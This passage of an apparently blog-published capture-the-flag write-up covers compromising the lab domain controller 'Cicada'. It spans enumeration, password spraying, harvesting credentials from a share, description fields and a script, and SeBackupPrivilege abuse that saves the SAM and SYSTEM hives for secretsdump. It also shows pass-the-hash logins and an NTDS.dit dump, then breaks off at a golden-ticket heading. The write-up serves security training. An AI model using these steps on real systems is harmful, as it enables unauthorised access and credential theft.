+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-31 09:35 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.115.238
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65522</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-10-31 16:38:14Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>53003/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2024-10-31T16:39:11
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: 6h59m59s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 242.85 seconds</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>Findings</strong>:
+<ul>
+<li>RPC is enabled it seems.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="ldap-389">LDAP <code>389</code>:</h3>
+<h4 id="using-ldap-anonymous-bind-to-enumerate-further">Using LDAP anonymous bind to enumerate further:</h4>
+<ul>
+<li>
+<p>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.</p>
+<ul>
+<li>We can actually retrieve a significant amount of information via anonymous bind such as:
+<ul>
+<li>A list of all users</li>
+<li>A list of all groups</li>
+<li>A list of all computers.</li>
+<li>User account attributes.</li>
+<li>The domain password policy.</li>
+<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
+<li>Passwords stored in the description fields</li>
+</ul>
+</li>
+<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
+</ul>
+</li>
+<li>
+<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
+<ul>
+<li><a href="https://github.com/bloodstiller/ldapire">https://github.com/bloodstiller/ldapire</a></li>
+<li><a href="https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb">https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb</a>
+<ul>
+<li><code>python3 ldapchecker.py $box</code>
+<ul>
+<li>It will dump general information &amp; also detailed &amp; simple information including:
+<ul>
+<li>Groups</li>
+<li>Users</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Cicada/scans/ldap%20%20%f0%9f%8d%a3%20main%20%f0%9f%93%9d%20%c3%97110%f0%9f%9b%a4%ef%b8%8f%20%20%c3%97142%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2009:36:11%20zsh%20%e2%9d%af%20python3%20/home/kali/windowsTools/enumeration/ldapire.py%20$box%0aAttempting%20to%20connect%20to%2010.129.115.238%20with%20SSL...%0aConnected%20successfully%20using%20anonymous%20bind.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=cicada,DC=htb%0a%20%20%20%20CN=Configuration,DC=cicada,DC=htb%0a%20%20%20%20CN=Schema,CN=Configuration,DC=cicada,DC=htb%0a%20%20%20%20DC=DomainDnsZones,DC=cicada,DC=htb%0a%20%20%20%20DC=ForestDnsZones,DC=cicada,DC=htb">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Cicada/scans/ldap  🍣 main 📝 ×110🛤️  ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 09:36:11 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box
+</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.115.238 with SSL...
+</span></span><span style="display:flex;"><span>Connected successfully using anonymous bind. Retrieving server information...
+</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  Naming contexts:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>cicada,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cicada,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cicada,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>cicada,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>cicada,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the domain functionality level<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
+</span></span><span style="display:flex;"><span>  domainFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  forestFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  rootDomainNamingContext:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>cicada,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>  ldapServiceName:
+</span></span><span style="display:flex;"><span>    cicada.htb:cicada-dc$@CICADA.HTB</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
+<ul>
+<li>
+<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+</li>
+<li>
+<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
+</li>
+<li>
+<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
+</li>
+<li>
+<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
+</li>
+<li>
+<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Functional Level Number</th>
+          <th>Corresponding OS</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0</td>
+          <td>Windows 2000</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td>Windows Server 2003 Interim</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>Windows Server 2003</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>Windows Server 2008</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>Windows Server 2008 R2</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>Windows Server 2012</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>Windows Server 2012 R2</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>Windows Server 2016</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>Windows Server 2019</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td>Windows Server 2022</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>+Note+:
+<ul>
+<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
+<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
+<ul>
+<li>Again we can see this has the CN as the base (mentioned previously.)
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>CICADA-DC,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cicada,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
+<ul>
+<li>We have the naming context.</li>
+<li>Domain name.</li>
+</ul>
+</li>
+<li>
+<p><strong>I update my <code>/etc/hosts</code> file now that we have the server name</strong>.</p>
+<ul>
+<li>This is so we can use tools like <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for user enumeration as well as other tools later on.</li>
+<li><code>echo &quot;$box   $domain $machine.$domain&quot; | sudo tee -a /etc/hosts</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="dns-53">DNS <code>53</code>:</h3>
+<ul>
+<li><strong>Using dnsenum to enumerate DNS entries</strong>:
+<ul>
+<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-104650_.png">
+</figure>
+</li>
+<li>Nothing of note.</li>
+</ul>
+</li>
+</ul>
+<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
+<h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> to bruteforce Usernames:</h4>
+<ul>
+<li>As kerberos is present we can enumerate users using <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:
+<ul>
+<li><code>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-104728_.png">
+</figure>
+</li>
+<li>Nothing of note.</li>
+</ul>
+</li>
+</ul>
+<h3 id="rpc">RPC:</h3>
+<ul>
+<li>
+<p><strong>I connect using anonymous session</strong>:</p>
+<ul>
+<li><code>rpcclient -U &quot;&quot; $box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-110457_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I connect using</strong> <code>rpcclient</code> <strong>using a null session</strong>:</p>
+<ul>
+<li><code>rpcclient -U &quot;%&quot; $box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-110340_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I am unable to enumerate either.</p>
+</li>
+</ul>
+<h3 id="smb-445">SMB <code>445</code>:</h3>
+<h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
+<ul>
+<li><strong>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold</strong>:
+<ul>
+<li><code>netexec smb $box -u 'guest' -p '' --shares</code>
+<ul>
+<li>We can access using the guest account and can see there is an HR share there.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-104931_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>netexec smb $box -u '' -p '' --shares</code>
+<ul>
+<li>No access via null share.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-the-hr-share">Enumerating the HR Share:</h3>
+<ul>
+<li>
+<p><strong>Connect to the share</strong>:</p>
+<ul>
+<li><code>smbclient -U 'guest' &quot;\\\\$box\\Public&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-105952_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Find a file</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-105916_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Download file</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-110012_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-a-hard-coded-cred-in-notice-from-hr-dot-txt">Finding a hard-coded cred in &ldquo;Notice from HR.txt&rdquo;:</h3>
+<ul>
+<li>
+<p><strong>Reading the file there is a hard-coded password in the file</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-132352_.png">
+</figure>
+</li>
+<li>Now we just need a username to enumerate further.</li>
+</ul>
+</li>
+<li>
+<p><strong>I check the exif information of the file incase there is any creator information there</strong>:</p>
+<ul>
+<li><code>exiftool Notice\ from\ HR.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-133010_.png">
+</figure>
+</li>
+<li>There is none</li>
+</ul>
+</li>
+</ul>
+<h3 id="using-impacket-lookupsid">Using impacket-lookupsid:</h3>
+<ul>
+<li><strong>We can use</strong> <code>impacket-lookupsid</code> <strong>to enumerate users on the domain</strong>:
+<ul>
+<li><code>impacket-lookupsid $domain/guest@$machine.$domain -domain-sids</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-144901_.png">
+</figure>
+</li>
+<li>+Note+: As we are using the &ldquo;Guest&rdquo; account we can just hit enter for a blank password</li>
+</ul>
+</li>
+</ul>
+<h3 id="password-spraying">Password Spraying:</h3>
+<ul>
+<li>With the new users list I password spray &amp; get a hit for the user: <code>michael.wrightson</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-145636_.png">
+</figure>
+</li>
+<li>+Note+: We know it&rsquo;s Michael&rsquo;s password still as it does not have &ldquo;<code>Guest</code>&rdquo; written besides it.</li>
+</ul>
+</li>
+</ul>
+<h4 id="why-does-guest-appear-beside-all-the-names">Why does guest appear beside all the names?</h4>
+<ul>
+<li>If you haven&rsquo;t seen this before check out this link.
+<ul>
+<li>
+<p><a href="https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon">https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon</a></p>
+</li>
+<li>
+<p>Which says this:</p>
+<blockquote>
+<p>Using a random username and password you can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server you&rsquo;re targetting is enabled.</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><strong>Guest account in</strong> <code>SMB</code>:
+<ul>
+<li><code>SMB</code> servers often allow users to connect as a <code>Guest</code>, meaning the users have limited or no write permissions. The server may allow these users to read files but restrict their ability to modify or create new files.</li>
+<li>In this case <code>authority.htb\[user]:[Pass](Guest)</code> indicates that the <code>[user]</code> account is authenticated, but with Guest permissions, likely meaning the account does not have full access to resources.</li>
+<li>So when you see &ldquo;<code>Guest</code>&rdquo; listed after users like <code>authority.htb\ryan</code>, <code>authority.htb\tom</code>, etc., it indicates that the user account is being authenticated using the Guest account privileges in SMB.</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="enumerating-as-michael-dot-wrightson">Enumerating as michael.wrightson:</h3>
+<ul>
+<li><strong>We can see we have access to more shares</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-151025_.png">
+</figure>
+</li>
+<li>I check the shares but there is nothing of note.</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-users-using-rpc">Enumerating users using RPC:</h3>
+<p>As we have credentials we can perform credentialed RPC enumeration now.</p>
+<ul>
+<li>
+<p><strong>I connect using</strong> <code>rpcclient</code>:</p>
+<ul>
+<li><code>rpcclient -U $user $box</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Let&rsquo;s list the users on the domain so we can get their</strong> <code>RID</code></p>
+<ul>
+<li><code>enumdomusers</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-173716_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-a-password-in-the-description-field-via-rpc">Finding a password in the description field via RPC:</h3>
+<ul>
+<li>Enumerating the users I find the user <code>david.orelius</code> has stored their password in clear text in the description field of their account:
+<ul>
+<li><code>queryuser 0x454</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-173950_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-as-david-dot-orelius">Enumerating as david.orelius:</h3>
+<ul>
+<li><strong>We can see we have access to the</strong> <code>DEV</code> <strong>share as david</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-174326_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="finding-a-backup-script-in-the-dev-share-dot">Finding a backup script in the DEV share.</h4>
+<ul>
+<li>
+<p><strong>I connect to the</strong> <code>DEV</code> <strong>share and find the script</strong> <code>Backup_script.ps1</code>.</p>
+<ul>
+<li><code>smbclient -U $user &quot;\\\\$box\\DEV&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-174524_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I download the script</strong>:</p>
+<ul>
+<li><code>get Backup_script.ps1</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-174616_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="finding-credentials-in-the-backup-script">Finding credentials in the backup script:</h4>
+<ul>
+<li><strong>Looking in the script I find credentials for the user</strong> <code>emily.oscars</code>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-174700_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="authenticating-as-emily-dot-oscars">Authenticating as emily.oscars:</h3>
+<ul>
+<li>
+<p><strong>Authenticating as emily we can see she has access to more shares</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-175606_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I login via</strong> <code>evil-winrm</code>:</p>
+<ul>
+<li><code>evil-winrm -i $box -u $user -p $pass</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-175734_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I grab the user flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-180345_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="discovering-we-are-part-of-the-backup-operators-group">Discovering we are part of the backup operators group:</h3>
+<ul>
+<li>Checking emily&rsquo;s group membership we can see she is part of the <code>backup operators</code> group:
+<ul>
+<li><code>whoami /groups</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-180526_.png">
+</figure>
+</li>
+<li>This means we will have the <code>SebackupUpPrivilege</code>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-180814_.png">
+</figure>
+</li>
+<li>The <code>SeBackupPrivilege</code> allows us to backup the SAM &amp; System registry hives.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="backup-operators-and-sebackupprivilege-primer">Backup Operators &amp; SeBackupPrivilege Primer:</h4>
+<ul>
+<li>
+<p><strong>Members of the</strong> <code>Backup Operators</code> <strong>&amp;</strong> <code>Server Operators</code> <strong>get the</strong> <code>theSeBackupPrivilege</code> <strong>by default</strong></p>
+</li>
+<li>
+<p>This privilege will allow us to copy a file from a folder, even if there is no access control entry (<code>ACE</code>) for our user on the folder&rsquo;s access control list (<code>ACL</code>) However, we cannot copy using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">FILE_FLAG_BACKUP_SEMANTICS</a> flag. This means we can use tools like <code>reg save</code> as it allows registry hives to be exported whilst bypassing <code>ACLs</code></p>
+</li>
+<li>
+<p><strong>Key Information About this privielge</strong>:</p>
+<ul>
+<li>Allows a process to read any file, regardless of the file&rsquo;s permissions.</li>
+<li>Used primarily for backup applications that need access to all files.</li>
+<li>Bypasses standard file read permissions.</li>
+<li>Does not enable writing or deleting files, only reading.</li>
+<li>Typically assigned to backup software or administrative tasks.</li>
+</ul>
+</li>
+<li>
+<p><strong>Security Considerations</strong>:</p>
+<ul>
+<li>High potential for abuse if granted to unauthorized applications or users.</li>
+<li>Should be closely monitored and restricted to trusted applications and personnel.</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-ownership">4. Ownership:</h2>
+<h3 id="dumping-registry-hives-and-extracting-creds-using-secretsdump">Dumping Registry Hives &amp; extracting creds using secretsdump:</h3>
+<ul>
+<li>
+<p>As mentioned previously we can use the <code>reg save</code> command to programatically copy the registry the hives and bypass ACL&rsquo;s. The only reason we can do this is due to us having the <code>SeBackupPrivilege</code></p>
+</li>
+<li>
+<p><strong>I Dump the Hives</strong>:</p>
+<ul>
+<li><code>reg save HKLM\SYSTEM SYSTEM.SAV</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-181418_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li><code>reg save HKLM\SAM SAM.SAV</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-181430_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I transfer the hives back to my attack machine</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-181557_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Extract the secrets using</strong> <code>impacket-secretsdump</code>:</p>
+<ul>
+<li><code>impacket-secretsdump -sam SAM.SAV -system SYSTEM.SAV LOCAL</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-181844_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Login as the administrator using their hash</strong>:</p>
+<ul>
+<li><code>evil-winrm -i $box -u $user -H $hash</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Get our root flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-01-123531_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-dot-persistence">5. Persistence:</h2>
+<h3 id="dumping-ntds-dot-dit">Dumping NTDS.dit:</h3>
+<ul>
+<li><strong>I dump the ntds.dit using</strong> <code>netexec</code>:
+<ul>
+<li><code>netexec smb $box -u $user -H $hash -M ntdsutil</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-182224_.png">
+</figure>
+</li>
+<li>+Note+:
+<ul>
+<li>Need to sort out these errors, this is a fresh VM so need to sort these python errors out.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="creating-a-kerberos-golden-ticket">Creating a Kerberos Golden Ticket:</h3>
+<ul>
+<li>
